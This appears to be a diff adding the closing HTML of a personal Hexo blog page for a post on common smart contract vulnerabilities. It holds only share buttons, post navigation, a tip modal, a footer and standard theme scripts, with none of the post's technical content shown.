+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://yichen115.github.io/2020/04/27/moa35g/&title=《智能合约常见漏洞》 — yichen's blog&source=" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://yichen115.github.io/2020/04/27/moa35g/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《智能合约常见漏洞》 — yichen's blog&url=https://yichen115.github.io/2020/04/27/moa35g/&via=https://yichen115.github.io" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://yichen115.github.io/2020/04/27/moa35g/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+
+    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
+        <i class="icon icon-share-alt icon-lg"></i>
+    </a>
+</div>
+
+
+
+        </div>
+    </div>
+
+    
+<nav class="post-nav flex-row flex-justify-between">
+  
+    <div class="waves-block waves-effect prev">
+      <a href="/2020/04/29/cs95s3/" id="post-prev" class="post-nav-link">
+        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
+        <h4 class="title">回退函数</h4>
+      </a>
+    </div>
+  
+
+  
+    <div class="waves-block waves-effect next">
+      <a href="/2020/04/27/rgi4ih/" id="post-next" class="post-nav-link">
+        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
+        <h4 class="title">DC-7</h4>
+      </a>
+    </div>
+  
+</nav>
+
+
+
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</article>
+
+<div id="reward" class="page-modal reward-lay">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <h3 class="reward-title">
+        <i class="icon icon-quote-left"></i>
+        谢谢大爷~
+        <i class="icon icon-quote-right"></i>
+    </h3>
+    <div class="reward-content">
+        
+        <div class="reward-code">
+            <img id="rewardCode" src="/img/wechat.jpg" alt="打赏二维码">
+        </div>
+        
+        <label class="reward-toggle">
+            <input id="rewardToggle" type="checkbox" class="reward-toggle-check"
+                data-wechat="/img/wechat.jpg" data-alipay="/img/alipay.jpg">
+            <div class="reward-toggle-ctrol">
+                <span class="reward-toggle-item wechat">微信</span>
+                <span class="reward-toggle-label"></span>
+                <span class="reward-toggle-item alipay">支付宝</span>
+            </div>
+        </label>
+        
+    </div>
+</div>
+
+
+
+</div>
+
+        <footer class="footer">
+    <div class="top">
+        
+<p>
+    <span id="busuanzi_container_site_uv" style='display:none'>
+        站点总访客数：<span id="busuanzi_value_site_uv"></span>
+    </span>
+    <span id="busuanzi_container_site_pv" style='display:none'>
+        站点总访问量：<span id="busuanzi_value_site_pv"></span>
+    </span>
+</p>
+
+
+        <p>
+            
+                <span><a href="/atom.xml" target="_blank" class="rss" title="rss"><i class="icon icon-lg icon-rss"></i></a></span>
+            
+            <span>博客内容遵循 <a rel="license noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享 署名 - 非商业性 - 相同方式共享 4.0 国际协议</a></span>
+        </p>
+    </div>
+    <div class="bottom">
+        <p><span>yichen &copy; 2020</span>
+            <span>
+                
+                Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme <a href="https://github.com/yscoder/hexo-theme-indigo" target="_blank">indigo</a>
+            </span>
+        </p>
+    </div>
+</footer>
+
+    </main>
+    <div class="mask" id="mask"></div>
+<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>
+
+
+
+<div class="global-share" id="globalShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://yichen115.github.io/2020/04/27/moa35g/&title=《智能合约常见漏洞》 — yichen's blog&pic=https://yichen115.github.io/img/avatar.png" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://yichen115.github.io/2020/04/27/moa35g/&title=《智能合约常见漏洞》 — yichen's blog&source=" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://yichen115.github.io/2020/04/27/moa35g/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《智能合约常见漏洞》 — yichen's blog&url=https://yichen115.github.io/2020/04/27/moa35g/&via=https://yichen115.github.io" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://yichen115.github.io/2020/04/27/moa35g/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+<div class="page-modal wx-share" id="wxShare">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <img src="//api.qrserver.com/v1/create-qr-code/?data=https://yichen115.github.io/2020/04/27/moa35g/" alt="微信分享二维码">
+</div>
+
+
+
+
+    <script src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
+<script>
+var BLOG = { ROOT: '/', SHARE: true, REWARD: true };
+
+
+</script>
+
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/main.min.js"></script>
+
+
+<div class="search-panel" id="search-panel">
+    <ul class="search-result" id="search-result"></ul>
+</div>
+<template id="search-tpl">
+<li class="item">
+    <a href="{path}" class="waves-block waves-effect">
+        <div class="title ellipsis" title="{title}">{title}</div>
+        <div class="flex-row flex-middle">
+            <div class="tags ellipsis">
+                {tags}
+            </div>
+            <time class="flex-col time">{date}</time>
+        </div>
+    </a>
+</li>
+</template>
+
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/search.min.js" async></script>
+
+
+
+
+
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+<script>
+(function() {
+    var OriginTitile = document.title, titleTime;
+    document.addEventListener('visibilitychange', function() {
+        if (document.hidden) {
+            document.title = '记得回来啊！';
+            clearTimeout(titleTime);
+        } else {
+            document.title = '欢迎回来!';
+            titleTime = setTimeout(function() {
+                document.title = OriginTitile;
+            },2000);
+        }
+    });
+})();
+</script>
+
+
+
+</body>
+</html>
